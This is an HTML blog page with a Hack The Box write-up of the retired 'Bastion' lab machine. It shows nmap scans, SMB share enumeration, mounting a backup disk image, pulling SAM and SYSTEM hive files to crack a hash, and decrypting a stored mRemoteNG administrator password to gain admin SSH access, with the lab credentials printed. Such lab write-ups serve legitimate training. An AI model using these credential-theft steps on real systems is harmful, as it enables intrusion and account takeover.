@@ -1,0 +1,507 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>HTB Bastion Write Up | baphzero</title>
+  <meta name="author" content="Rodhnny Acosta">
+  
+  <meta name="description" content="Bastion!A bit old by now but one of my favorites boxes to root; since I had some familiarity with SMB.We have the basic information for the box, It’s a Windows Machine we got IP and off we go..Let’s get into it! .
+
+
+ 
+
+root@kek:/# ping bastion.htb
+PING bastion (10.10.10.134) 56(84) bytes of data.
+64 bytes from bastion (10.10.10.134): icmp_seq=1 ttl=127 time=184 ms
+64 bytes from bastion (10.10.10.134): icmp_seq=2 ttl=127 time=178 ms
+
+Now we scan for ports and interesting stuff:
+ | nmap -sV -sC -sC -T4 -oA Bastion 10.10.10.134
+
+Using nmap we got some interesting ports open:  
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0)
+| ssh-hostkey:
+| 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
+| 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
+|_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+Service Info: OSs: Windows, Windows Server 2008 R2–2012; CPE: cpe:/o:microsoft:windows
+
+Soo two interesting ports we are going to check in detail are SMB and SSH; as a noobish guy at first I was trying to brute force SSH but after a while I decided to throw away the idea of an easy brute force ssh connection.I went for the SMB route; If we take a close look at nmap info;
+| smb-os-discovery:
+| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+| Computer name: Bastion
+| NetBIOS computer name: BASTION\x00
+| Workgroup: WORKGROUP\x00
+|_ System time: 2020–05–26T04:39:56+02:00
+| smb-security-mode:
+| account_used: guest
+| authentication_level: user
+| challenge_response: supported
+|_ message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+| 2.02:
+|_ Message signing enabled but not required
+| smb2-time:
+| date: 2020–05–25 22:39:57
+|_ start_date: 2020–05–25 18:03:52&amp;gt;"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="HTB Bastion Write Up"/>
+  <meta property="og:site_name" content="baphzero"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">baphzero</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> HTB Bastion Write Up</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Bastion"><a href="#Bastion" class="headerlink" title="Bastion!"></a>Bastion!</h1><p>A bit old by now but one of my favorites boxes to root; since I had some familiarity with SMB.<br>We have the basic information for the box, It’s a Windows Machine we got IP and off we go..<br>Let’s get into it! .</p>
+</header>
+
+<div class="image main"> <p><img src="/assets/images/bastion.jpg" alt="bastion"></p></div>
+
+<pre><code>root@kek:/# ping bastion.htb
+PING bastion (10.10.10.134) 56(84) bytes of data.
+64 bytes from bastion (10.10.10.134): icmp_seq=1 ttl=127 time=184 ms
+64 bytes from bastion (10.10.10.134): icmp_seq=2 ttl=127 time=178 ms
+</code></pre>
+<p>Now we scan for ports and interesting stuff:</p>
+<pre><code> | nmap -sV -sC -sC -T4 -oA Bastion 10.10.10.134
+</code></pre>
+<p>Using nmap we got some interesting ports open:  </p>
+<pre><code>PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0)
+| ssh-hostkey:
+| 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
+| 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
+|_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+Service Info: OSs: Windows, Windows Server 2008 R2–2012; CPE: cpe:/o:microsoft:windows
+</code></pre>
+<p>Soo two interesting ports we are going to check in detail are SMB and SSH; as a noobish guy at first I was trying to brute force SSH but after a while I decided to throw away the idea of an easy brute force ssh connection.<br>I went for the SMB route; If we take a close look at nmap info;</p>
+<pre><code>| smb-os-discovery:
+| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+| Computer name: Bastion
+| NetBIOS computer name: BASTION\x00
+| Workgroup: WORKGROUP\x00
+|_ System time: 2020–05–26T04:39:56+02:00
+| smb-security-mode:
+| account_used: guest
+| authentication_level: user
+| challenge_response: supported
+|_ message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+| 2.02:
+|_ Message signing enabled but not required
+| smb2-time:
+| date: 2020–05–25 22:39:57
+|_ start_date: 2020–05–25 18:03:52&gt;
+</code></pre>
+<p>Here we got two routes, we can directly check if we can use something like the good ol’ msf or smbmap;</p>
+<p>Let’s go first with msf, we are going to use the scanner: auxiliary/scanner/smb/smb_enumshares.</p>
+<p>**</p>
+<pre><code>msf5 &gt; use auxiliary/scanner/smb/smb_enumshares
+</code></pre>
+<p>**We set the options required:  </p>
+<pre><code>msf5 auxiliary(scanner/smb/smb_enumshares) &gt; set rhost 10.10.10.134
+rhost =&gt; 10.10.10.134
+msf5 auxiliary(scanner/smb/smb_enumshares) &gt; set showfiles yes
+showfiles =&gt; true  
+</code></pre>
+<p>and Exploit/run!</p>
+<pre>**`msf5 auxiliary(scanner/smb/smb_enumshares) > exploit
+[-] 10.10.10.134:139 — Login Failed: Unable to Negotiate with remote host
+[+] 10.10.10.134:445 — ADMIN$ — (DS) Remote Admin
+[+] 10.10.10.134:445 — Backups — (DS)
+[+] 10.10.10.134:445 — C$ — (DS) Default share
+[+] 10.10.10.134:445 — IPC$ — (I) Remote IPC
+[*] 10.10.10.134: — Scanned 1 of 1 hosts (100% complete)` **</pre>
+
+<p>It’s always nice to see a backup dir laying around.<br>Using SMBMap can be quite fast also;</p>
+<pre><code>root@kek:~/htb/bastion# smbmap -H 10.10.10.134 -u guest
+[+] Finding open SMB ports….
+[+] User SMB session establishd on 10.10.10.134…
+[+] IP: 10.10.10.134:445 Name: bastion.htb
+Disk Permissions
+— — — — — — — -
+ADMIN$ NO ACCESS
+Backups READ, WRITE
+[!] Unable to remove test directory at \\10.10.10.134\Backups\tBNzRnYGJM, plreae remove manually
+C$ NO ACCESS
+IPC$ READ ONLY
+</code></pre>
+<p>Listing further on that backup dir:  </p>
+<pre><code>| root@kek:~/htb/bastion# smbmap -u guest -H 10.10.10.134 -R Backups
+</code></pre>
+<div class="image main"> <p><img src="/assets/images/bastion2.jpg" alt="smbmap"></p></div>
+
+<p>Interesting enough we got a note.txt and some .vhd files that immediately took my attention; vhd files are virtual hard disks but look at the size ( ͡° ͜ʖ ͡°)</p>
+<p>Let’s look at note.txt</p>
+<pre><code>|root@kek:~/htb/bastion# cat 10.10.10.134-Backups_note.txt
+|Sysadmins: please don’t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
+</code></pre>
+<p>Indeed trying to pull out the vhd will take some time, so there’s two options, trying to mount the vhd or pulling the files out first.<br>We are going to try to mount it;</p>
+<pre><code>| root@kek:~/htb/bastion# mkdir /mnt/bastion
+| root@kek:~/htb/bastion# cd /mnt/bastion/
+| root@kek:/mnt/bastion# mount -t cifs //10.10.10.134/Backups /mnt/bastion -o rw
+| Password for root@//10.10.10.134/Backups:
+
+| root@kek:/mnt# ls -lah bastion/
+| total 8.5K
+| drwxr-xr-x 2 root root 4.0K May 25 18:28 .
+| drwxr-xr-x 5 root root 4.0K May 25 18:27 ..
+| drwxr-xr-x 2 root root 0 May 25 18:28 CaShLznVPF
+| drwxr-xr-x 2 root root 0 May 25 18:20 MfNzIPZylH
+| -r-xr-xr-x 1 root root 116 Apr 16 2019 note.txt
+| drwxr-xr-x 2 root root 0 May 25 18:17 pIrubieZcm
+| -rwxr-xr-x 1 root root 0 Feb 22 2019 SDT65CB.tmp
+| drwxr-xr-x 2 root root 0 May 25 18:18 tBNzRnYGJM
+| drwxr-xr-x 2 root root 0 Feb 22 2019 WindowsImageBackup  
+</code></pre>
+<p>and we going for the files in the vhd’s.</p>
+<pre><code>|root@kek:/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019–02–22 124351# ls -lah
+|total 5.1G
+|drwxr-xr-x 2 root root 8.0K Feb 22 2019 .
+|drwxr-xr-x 2 root root 4.0K Feb 22 2019 ..
+|-rwxr-xr-x 1 root root 37M Feb 22 2019 9b9cfbc3–369e-11e9-a17c-806e6f6e6963.vhd
+|-rwxr-xr-x 1 root root 5.1G Feb 22 2019 9b9cfbc4–369e-11e9-a17c-806e6f6e6963.vhd
+|-rwxr-xr-x 1 root root 1.2K Feb 22 2019 BackupSpecs.xml
+</code></pre>
+<p>now, how the h*ck we mount those vhd? well, I learned how to using this stackoverflow: <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/36819474/how-can-i-attach-a-vhdx-or-vhd-file-in-linux">https://stackoverflow.com/questions/36819474/how-can-i-attach-a-vhdx-or-vhd-file-in-linux</a></p>
+<pre><code>|root@kek:/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019–02–22 124351# guestmount — add /mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup\ 2019–02–22\ 124351/9b9cfbc4–369e-11e9-a17c-806e6f6e6963.vhd — inspector — ro /mnt/vhd -v
+</code></pre>
+<div class="image main"> <p><img src="/assets/images/bastion3.jpg" alt="hey"></p></div>
+
+<p>Explored Users and found no flag tho.<br>But hey! we got a “Windows\System32\config” dir!<br>So we pull both SAM and SYSTEM files.</p>
+<div class="image main"> <p><img src="/assets/images/bastion4.jpg" alt="lsls"></p></div>
+
+<p>Now we got the hash and we need to crack it, either online on some repo or hash cat :)</p>
+<p>|The hash will contain the pass bureaulampje  </p>
+<p>nooow, we got an user and a password.<br>If we go back we could either go back the SMB route or the SSH, since we got a credential to try let’s give SSH a chance:</p>
+<pre><code>    | root@kek:~/htb/bastion# ssh L4mpje@10.10.10.134
+     L4mpje@10.10.10.134’s password:
+     Microsoft Windows [Version 10.0.14393]
+     © 2016 Microsoft Corporation. All rights reserved.
+     l4mpje@BASTION C:\Users\L4mpje&gt;whoami
+     bastion\l4mpje
+</code></pre>
+<p>And now going directly to \Desktop we’ll find the <strong>user.txt</strong></p>
+<div class="image main"> <p><img src="/assets/images/bastion5.jpg" alt="user"></p></div>
+
+<p>Now we go back to lookup and we have access and whatnot.</p>
+<p>Let’s see how we can get to root.txt</p>
+<pre><code>Directory of C:\Program Files (x86)
+22–02–2019 15:01 &lt;&quot;DIR&gt; .
+22–02–2019 15:01 &lt;&quot;DIR&gt; ..
+16–07–2016 15:23 &lt;&quot;DIR&gt; Common Files
+23–02–2019 10:38 &lt;&quot;DIR&gt; Internet Explorer
+16–07–2016 15:23 &lt;&quot;DIR&gt; Microsoft.NET
+22–02–2019 15:01 &lt;&quot;DIR&gt; mRemoteNG
+23–02–2019 11:22 &lt;&quot;DIR&gt; Windows Defender
+23–02–2019 10:38 &lt;&quot;DIR&gt; Windows Mail
+23–02–2019 11:22 &lt;&quot;DIR&gt; Windows Media Player
+16–07–2016 15:23 &lt;&quot;DIR&gt; Windows Multimedia Platform
+16–07–2016 15:23 &lt;&quot;DIR&gt; Windows NT
+23–02–2019 11:22 &lt;&quot;DIR&gt; Windows Photo Viewer
+16–07–2016 15:23 &lt;&quot;DIR&gt; Windows Portable Devices
+16–07–2016 15:23 &lt;&quot;DIR&gt; WindowsPowerShell
+0 File(s) 0 bytes
+14 Dir(s) 11.305.861.120 bytes free
+</code></pre>
+<p>Pretty much random stuff, but what mostly stands out is the mRemoteNG.<br>Looking up more info on vulnerabilities or stuff on mRemoteNG we found this on the web: <a target="_blank" rel="noopener" href="https://hackersvanguard.com/mremoteng-insecure-password-storage/">https://hackersvanguard.com/mremoteng-insecure-password-storage/</a>  </p>
+<p>soooooo let’s take a look at the conf file at <strong>“\Users\L4mpje\AppData\Roaming\mRemoteNG”</strong> I pretty much just did a “type confCons.xml” saved into a file and then less through the file to find the password between the lines:  </p>
+<pre><code>Icon=”mRemoteNG” Panel=”General” Id=”500e7d58–662a-44d4-aff0–3a4f547a3fee” Userna
+me=”Administrator” Domain=”” Password=”aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==”
+Hostname=”127.0.0.1&quot;
+</code></pre>
+<p>There’s plenty of ways to “decrypt” the password, the ones mentioned by the hackersvanguard page or using this python script.<br>Once decrypted you’ll have the password, be able to ssh into the box as administrator, grab the flag and call it a day! :)  </p>
+<pre><code>root@kek:~/htb/bastion/mremoteng-decrypt# python3 mremoteng_decrypt.py -s “aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==”
+Password: thXLHM96BeKL0ER2
+root@kek:~/htb/bastion/mremoteng-decrypt# ssh administrator@10.10.10.134
+administrator@10.10.10.134’s password:
+</code></pre>
+<div class="image main"> <p><img src="/assets/images/bastion6.jpg" alt="user"></p></div>
+
+<p>Hope this was at someway useful, informative perhaps. Even though this is a bit of an old box it’s always good to go back and practice a bit.<br>Keep in consideration I am not by any means an expert or highly efficient on this yet and a lot of the process was trimmed in order to keep the post as short as I could.<br>Hopefully I will be uploading a write up for retired machiones, every Monday from now on until end of year (Which the target is the OSCP exam) :) Thanks for taking the time to read this or skip here too!</p>
+<p>**</p>
+<p>Hack the planet! x)</p>
+<p>**</p>
+<div class="image">![user](1_8WINeDA9BY08yp2xvoQGIQ.jpg)</div>
+
+</section>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.
+</div>
+
+	</div>
+
+	
+	<span id="/2021/08/03/HTB-Bastion-Write-Up/" class="leancloud-visitors view" data-flag-title="HTB Bastion Write Up">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2021/08/03/HTB-Resolute-Write-Up/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2021/08/03/Blog-under-maintenance-due-technology-change/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"xxx","appKey":"xxx","placeholder":"sss","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "sss",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2021-08-03 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/HackTheBox/">HackTheBox<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2021 Rodhnny Acosta's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
